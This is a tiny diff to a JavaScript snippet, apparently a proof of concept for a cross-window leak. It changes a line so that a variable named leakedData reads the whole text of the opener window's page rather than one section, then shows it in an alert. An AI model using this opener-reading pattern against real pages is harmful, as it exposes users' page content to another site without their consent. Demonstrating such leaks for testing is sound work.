@@ -1,7 +1,7 @@
-var leakedData = window.opener.document.getElementsByClassName("section--2")[0].innerText
+var leakedData = window.opener.document.documentElement.innerText
+
+
 alert(leakedData)
-
-
 
 
 
